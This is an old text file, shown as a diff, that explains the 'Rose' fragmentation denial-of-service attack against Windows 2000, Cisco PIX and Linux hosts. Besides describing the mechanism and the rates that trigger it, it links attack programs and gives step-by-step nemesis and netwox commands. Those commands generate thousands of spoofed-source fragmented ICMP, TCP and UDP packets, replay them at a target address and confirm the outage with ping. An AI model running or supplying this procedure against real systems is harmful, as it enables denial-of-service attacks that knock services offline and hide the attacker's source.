@@ -1,0 +1,86 @@
+This document is located at the following URL and will be updated as needed:
+http://digital.net/~gandalf/Rose_Frag_Attack_Explained.txt
+
+This attack is fairly simple.  Send the first few bytes of a fragmented packet at offset 0, then send a few bytes at the end of a 64k sized packet.  If you send with a random source address then the only way to track down the attack is to trace it hop by hop (router by router) back to the source.  Source port does not matter because the packet has not "moved up the stack" yet, so the stack does not validate that the destination port is even valid.
+
+All legitimate fragmented packets are denied or impacted (UDP, TCP and ICMP) if you attack a machine.
+
+On Microsoft Windows 2000 all legitimate fragments are denied if you send 200 fragment pairs in two minutes.  Same with a Cisco PIX if you send 200 fragments in 5 to 20 seconds.
+
+Other devices like Linux some legitimate fragmentation is allowed through and some legitimate fragmentation is dropped, so the attack only impairs the fragmentation operation.  On some CPU's, however, the CPU utilization goes to 100%.
+
+Laurent Constantin was kind enough to program this attack from the below somewhat unwieldy set of instructions.  The program can be found at the following URL:
+http://digital.net/~gandalf/RoseAttackv1.txt
+
+Chuck (at) lemure.net found that he could spike the CPU of a Windows 200 machine to 100 percent with his code:
+http://digital.net/~gandalf/RoseAttackv2.txt
+
+Chuck's explanation:
+I have just been playing around with the timing on the second one.  What I have discovered is CPU only spikes for reassembling fragments for packets that already exist (ie, if you run incre_frag once, then ctrl-c and start again, the CPU and resources won't go through the moon).  Compiles on redhat-9.0
+
+The more manual set of instructions if you don't have a compiler :-) :
+A = "Attack" computer - Windows 2000, latest service pack and all patches
+B = The computer that is attacked - Windows 2000, latest service pack and all patches  for the purposes of this test assume that the IP of the attacked computer is 10.32.3.15.  Change as needed.
+C = outside computer - Windows 2000, latest service pack and all patches
+
+Load WinPcap on computer A
+http://winpcap.polito.it/
+Load WinDump on computer A
+http://windump.polito.it/
+(You probably don't need to load WinDump, but it is a good utility to have around)
+Load Nemesis on computer A in directory C:\nemesis-1.4beta3>
+http://www.packetfactory.net/projects/nemesis/
+Load netwox on computer A
+http://www.laurentconstantin.com/en/netw/netwox/
+Save the files Picmpdata.txt Ptcpdata.txt and Pudpdata.txt in the C:\nemesis-1.4beta3 directory (see attached).  These files are "sized" correctly to make "legal" fragmented packets.
+Bring Up nemITUrnd.xls (see attached file)
+
+Change the IP Address of the destination machine if needed.
+Select the rows, and fill down until you have seven thousand rows of packets
+
+Save as <name>.csv - MS-DOS Comma Separated Text
+
+Rename to <name>.txt
+
+Bring <name>.txt up word.  You will see the lines:
+nemesis icmp -S 10.,3,.,64,.,121, -D 10.32.3.15 -d1 -i 8 -I ,7242, -P Picmpdata.txt -FM0,~,nemesis ip -S 10.,3,.,64,.,121, -D 10.32.3.15 -d1 -I ,7242, -p 1 -P Picmpdata.txt -F8100,~,nemesis tcp -S 10.,196,.,212,.,207, -D 10.32.3.15 -d1 -I ,2153, -s ,2494456820, -x ,36961, -y ,63398, -P Ptcpdata.txt -FM0,~,nemesis ip -S 10.,196,.,212,.,207, -D 10.32.3.15 -d1 -I ,2153, -p 6 -P Ptcpdata.txt -F8100,~,nemesis udp -S 10.,195,.,74,.,172, -D 10.32.3.15 -d1 -I ,6316, -x ,13253, -y ,20460, -P Pudpdata.txt -FM0,~,nemesis ip -S 10.,195,.,74,.,172, -D 10.32.3.15 -d1 -I ,6316, -p 17 -P Pudpdata.txt -F8100
+
+Change "~" to Paragraph.
+Save document and exit
+
+(With a big file if you do both of these at the same time Word crawls to a stop, so save, exit, and bring it back up again)
+
+Bring <name>.txt up in word
+Change "," to nothing (I.e. replace "," with "")
+Save and Exit
+
+Copy <name>.txt to the directory where you put the nemesis executable:
+C:\nemesis-1.4beta3> rename <name>.txt to <name>.bat
+
+Open a cmd in and type the following for the ICMP UDP TCP Big Ping test:
+C:\>netwox54 7 -R "hexa" -o nemesispingbig.txt --kbd
+f
+(dst 10.32.3.15 and (tcp or udp or icmp))
+-
+
+Open a cmd in:
+C:\nemesis-1.4beta3>
+and type:
+<name>.bat
+
+Let it run for several hours.  You now have about 35,000 packets.  During this test (if your computer A is fast enough) you can see the result by running a fragmented ping on computer C:
+ping -t -l 1600 10.32.3.15
+
+You should see ping Request Time Out messages
+
+Now the real test begins (the previous just generated lots and lots of packets for you to send out all at once to "attack" the machine, you needed the attack machine on line to respond to ARP requests during the several hour test).  Start a ping from computer C that is fragmented:
+ping -t -l 1600 10.32.3.15
+
+To send all the packets all at once (first open Task Manager on computer B and watch the CPU utilization):
+
+netwox54 14 -s -f nemesispingbig.txt
+
+Now you should for sure see ping Request Time Out messages on computer C.  This will go on for about 2 minutes then the pings will start running again.
+
+The attack is two pronged.  First (the brute force attack) is that if you have enough attack machines you can either completely congest the bandwidth going to the server, or at the very least spike the CPU up to 100%.  The second effect is that the CPU cannot process fragmented packets until the queue for the fragments times out.
+
